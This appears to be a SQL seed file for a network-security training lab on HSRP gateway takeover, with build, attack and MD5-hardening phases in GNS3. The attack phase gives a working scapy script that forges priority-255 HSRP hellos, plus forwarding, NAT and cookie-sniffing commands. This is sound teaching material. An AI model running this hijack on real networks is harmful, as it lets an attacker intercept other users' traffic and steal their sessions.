-- ═══════════════════════════════════════════════════════
-- Lab 05 (id=5) — HSRP Takeover : full content (Vol 1 · Ch 10)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Configure HSRP for first-hop redundancy then hijack the active router.',
    topic = 'routing',
    difficulty = 'medium',
    book_ref = 'Vol 1 · Ch 10'
WHERE id = 5;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Two routers, one virtual gateway',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Build</span><h3>Two routers, one virtual gateway</h3></div>
    <p class="goal">R1 and R2 share a virtual IP (10.0.10.1) via HSRP group 1. R1 has priority 110, R2 100 — R1 is active. Confirm which router handles traffic for the VIP, then note the hello interval: every 3 seconds, multicast to 224.0.0.2, no authentication.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Interface addressing</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1#</span> conf t
<span class="prompt">R1(config)#</span> interface fa0/0
<span class="prompt">R1(config-if)#</span> ip address 10.0.10.2 255.255.255.0
<span class="prompt">R1(config-if)#</span> no shutdown

<span class="prompt">R2#</span> conf t
<span class="prompt">R2(config)#</span> interface fa0/0
<span class="prompt">R2(config-if)#</span> ip address 10.0.10.3 255.255.255.0
<span class="prompt">R2(config-if)#</span> no shutdown</pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> HSRP group 1 — R1 wins, R2 stands by</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config-if)#</span> standby 1 ip 10.0.10.1
<span class="prompt">R1(config-if)#</span> standby 1 priority 110
<span class="prompt">R1(config-if)#</span> standby 1 preempt

<span class="prompt">R2(config-if)#</span> standby 1 ip 10.0.10.1
<span class="prompt">R2(config-if)#</span> standby 1 priority 100
<span class="prompt">R2(config-if)#</span> standby 1 preempt</pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Verify the election</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1#</span> show standby brief
<span class="cmt">Interface   Grp  Pri  State    Active  Standby  Virtual IP
Fa0/0       1    110  Active   local   10.0.10.3  10.0.10.1</span>

<span class="prompt">R2#</span> show standby brief
<span class="cmt">Interface   Grp  Pri  State      Active     Standby  Virtual IP
Fa0/0       1    100  Standby   10.0.10.2   local   10.0.10.1</span></pre>
      <div class="note why"><strong>R1 is active because pri 110 > 100.</strong> Both routers share the same virtual MAC (0000.0c07.ac01) — GNS3 nodes ARP for 10.0.10.1 and get the active router's physical interface. This is the machine you're about to replace.</div>
    </div>
  </div>

  <!-- ATTACK -->
$md$
WHERE lab_id = 5 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Shout priority 255, own the VIP',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Attack</span><h3>Shout priority 255, own the VIP</h3></div>
    <p class="goal">HSRP hellos are unauthenticated by default and multicast to 224.0.0.2:1985 — everyone on the subnet hears them. Kali sends a crafted hello with priority 255, group 1, same VIP. R1 sees it, yields because 255 > 110. Kali is now the active router and every host that uses 10.0.10.1 as gateway sends its off-subnet traffic through you.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Listen — confirm you can see the hello stream</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> sudo tcpdump -i eth0 -nn 'host 224.0.0.2 and udp port 1985' -c 4
<span class="cmt">10.0.10.2 > 224.0.0.2: HSRP: Hello, pri=110, vip=10.0.10.1
10.0.10.3 > 224.0.0.2: HSRP: Hello, pri=100, vip=10.0.10.1</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Craft the takeover hello</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> cat > /tmp/hsrp_takeover.py << 'PYEOF'
from scapy.all import *
from scapy.contrib.hsrp import HSRP
import time

# HSRP hello: pri 255, state Active (16), group 1
pkt = Ether(dst="01:00:5e:00:00:02") / IP(src="10.0.10.66", dst="224.0.0.2", ttl=1) / \
      UDP(sport=1985, dport=1985) / HSRP(group=1, priority=255, state=16, \
      virtualIP="10.0.10.1", auth="cisco", hellotime=3, holdtime=10)

while True:
    sendp(pkt, iface="eth0", verbose=0)
    time.sleep(1.1)  # faster than R1's 3s hello
PYEOF
<span class="attackline">kali$ sudo python3 /tmp/hsrp_takeover.py</span></pre>
      <div class="note watch"><strong>The 1.1-second interval beats R1's 3-second hello.</strong> Even if the first packet loses the race, consistency wins: Kali is transmitting hellos nearly 3× faster than the legitimate routers. R1's hold timer (10s default) expires and it transitions to Speak → Standby.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Watch the coup happen</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1#</span> show standby brief
<span class="cmt">Interface   Grp  Pri  State    Active      Standby  Virtual IP
Fa0/0       1    110  Standby 10.0.10.66  local    10.0.10.1</span>
<span class="cmt">                              ^^^^^^^^^</span>
<span class="cmt">                              Kali's IP — not R2. R1 just demoted itself.</span>

<span class="prompt">R2#</span> show standby brief
<span class="attackline">Fa0/0       1    100  Speak    unknown    unknown  10.0.10.1
                 ^^^^ — R2 can't even elect; it sees pri 255</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">4</span> Turn on forwarding — now you're the gateway</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> sudo sysctl -w net.ipv4.ip_forward=1
<span class="prompt">kali$</span> sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

<span class="cmt"># Any host on the subnet that uses 10.0.10.1 as gateway
# now has its traffic transiting Kali's NIC.
</span>
<span class="prompt">kali$</span> sudo tcpdump -i eth0 -nn 'not udp port 1985 and not arp' -c 20
<span class="cmt">… traffic flowing through you, including the flag</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">5</span> Capture the flag through the hijacked gateway</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie
<span class="cmt">SESSION=NB5-hsrp-hijack-b3e2</span></pre>
    </div>
    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Capture a token after becoming the active HSRP router.</h4>
      <div class="flag-row"><input id="flag-in" placeholder="NB5-..."><button onclick="checkFlag()">Submit</button></div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>
    <details class="hint"><summary>Hint 1 — my script runs but nothing changes on R1</summary>
      <p>The multicast group 224.0.0.2 requires a TTL of 1 and the correct destination MAC (01:00:5e:00:00:02). Also confirm Kali has an IP on the same subnet (10.0.10.66/24) and that you can ping 224.0.0.2 — if IP multicast routing is off or the interface isn't up, the hello goes nowhere.</p></details>
    <details class="hint"><summary>Hint 2 — R1 stays Active no matter what priority I send</summary>
      <p>The scapy HSRP layer defaults to version 0 but modern IOS expects version 2 by default. In GNS3 c3725 images running IOS 12.4, try setting HSRP version explicitly: <code>standby version 1</code> on both routers, or modify the scapy packet to use HSRPv1 format (opcode=0). The lab assumes HSRPv1, which is the c3725 default.</p></details>
  </div>

  <!-- HARDEN -->
$md$
WHERE lab_id = 5 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Make routers prove who they are',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Harden</span><h3>Make routers prove who they are</h3></div>
    <p class="goal">HSRP authentication — a shared MD5 key string on the standby group — means every hello carries a digest. A rogue router that doesn't know the key string can't produce a valid digest, and its hellos are silently ignored. This one config line on each legitimate router defangs the entire attack.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Add MD5 authentication to group 1</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config-if)#</span> standby 1 authentication md5 key-string NetBr3ak3r

<span class="prompt">R2(config-if)#</span> standby 1 authentication md5 key-string NetBr3ak3r</pre>
      <div class="note trap"><strong>Trap:</strong> if you add auth on one router before the other, the unauthenticated router's hellos now fail validation and BOTH routers think they should be active — split-brain. Apply to both within the hold timer (10s), or apply during a maintenance window. In a lab: just do both interfaces back-to-back.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-run the takeover — your hellos are dropped silently</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ sudo python3 /tmp/hsrp_takeover.py</span>

<span class="prompt">R1#</span> debug standby events
<span class="cmt">HSRP: Fa0/0 Grp 1 Hello in from 10.0.10.66 has bad MD5 digest — dropped</span>

<span class="prompt">R1#</span> show standby brief
<span class="good">Interface   Grp  Pri  State    Active  Standby  Virtual IP
Fa0/0       1    110  Active   local   10.0.10.3  10.0.10.1</span></pre>
      <div class="note why"><strong>The digest is a one-way function of the shared key + the packet contents.</strong> Kali's hello, lacking the key or carrying a wrong digest, fails validation before the router even evaluates its priority. Priority 255 doesn't matter if your hello is dropped at the door.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Verify — R1 is still active and Kali's attack is nullified</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1#</span> show standby
<span class="cmt">  Authentication MD5, key-string
  Hello in 543, Hello out 105</span></pre>
    </div>
    <div class="nextlab">
      <b>Unlocks Lab 06 — GLBP (Gateway Load Balancing).</b> HSRP elects one active and the standby idles until a failure. GLBP distributes traffic across multiple active gateways, each with its own virtual MAC — and introduces its own version of the same hijack (AVF takeover via weight manipulation). Same multicast model, same authentication defence, but now there are multiple virtual forwarders to steal.
    </div>
  </div>
$md$
WHERE lab_id = 5 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  5,
  $svg$<svg viewBox="0 0 720 340" role="img" aria-label="R1 and R2 running HSRP with virtual IP .1, Kali on the same subnet, SW1 access switch">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">HSRP pri 110 · .2</text>
      <rect x="530" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="605" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R2</text>
      <text x="605" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">HSRP pri 100 · .3</text>
      <rect x="285" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="360" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="360" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2 · VLAN 10</text>
      <line x1="190" y1="55" x2="285" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="238" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">e0/0</text>
      <line x1="435" y1="55" x2="530" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="483" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <line x1="360" y1="80" x2="360" y2="250" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="375" y="170" font-family="monospace" font-size="9" fill="#e5484d">e0/2 · access</text>
      <rect x="300" y="250" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="360" y="272" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="360" y="288" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">HSRP hijacker</text>
      <text x="360" y="328" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">VIP: 10.0.10.1 — whoever shouts loudest owns it</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 340" role="img" aria-label="R1 and R2 running HSRP with virtual IP .1, Kali on the same subnet, SW1 access switch">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">HSRP pri 110 · .2</text>
      <rect x="530" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="605" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R2</text>
      <text x="605" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">HSRP pri 100 · .3</text>
      <rect x="285" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="360" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="360" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2 · VLAN 10</text>
      <line x1="190" y1="55" x2="285" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="238" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">e0/0</text>
      <line x1="435" y1="55" x2="530" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="483" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <line x1="360" y1="80" x2="360" y2="250" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="375" y="170" font-family="monospace" font-size="9" fill="#e5484d">e0/2 · access</text>
      <rect x="300" y="250" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="360" y="272" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="360" y="288" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">HSRP hijacker</text>
      <text x="360" y="328" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">VIP: 10.0.10.1 — whoever shouts loudest owns it</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
